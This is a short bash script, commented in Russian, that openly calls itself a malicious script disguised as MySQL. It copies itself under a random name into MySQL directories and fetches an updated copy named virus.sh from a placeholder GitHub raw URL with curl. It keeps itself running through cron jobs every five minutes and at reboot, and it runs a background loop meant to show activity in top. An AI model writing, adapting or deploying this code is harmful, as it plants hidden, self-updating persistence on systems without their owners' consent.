#!/bin/bash

# ВРЕДОНОСНЫЙ СКРИПТ (маскировка под MySQL)

# Конфигурация
GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/твой-логин/твой-репозиторий/main/virus.sh"
MYSQL_DIRS=(
    "/usr/local/mysql"
    "/var/lib/mysql" 
    "/etc/mysql"
    "/usr/sbin/mysql"
)

# Функция генерации случайного имени
generate_random_name() {
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1
}

# Функция поиска директории MySQL
find_mysql_dir() {
    for dir in "${MYSQL_DIRS[@]}"; do
        if [ -d "$dir" ]; then
            echo "$dir"
            return 0
        fi
    done
    
    mkdir -p /var/lib/mysql 2>/dev/null
    echo "/var/lib/mysql"
}

# Основная логика
main() {
    MYSQL_DIR=$(find_mysql_dir)
    RANDOM_NAME=$(generate_random_name)
    SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME.sh"
    
    # Если мы запущены не из целевой папки - копируем себя
    if [ "$0" != "$SCRIPT_PATH" ] && [ ! -f "$SCRIPT_PATH" ]; then
        cp "$0" "$SCRIPT_PATH"
        chmod +x "$SCRIPT_PATH"
    fi
    
    # Проверяем наличие в кроне
    if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
        # Скачиваем свежую версию
        curl -s "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"
        
        # Добавляем в крон две задачи
        (crontab -l 2>/dev/null
         echo "*/5 * * * * $SCRIPT_PATH >/dev/null 2>&1"
         echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
        ) | crontab -
    fi
    
    # Вредоносная активность (для видимости в top/htop)
    while true; do
        find / -name "*.conf" 2>/dev/null | head -100 > /dev/null
        sleep 60
    done &
}

main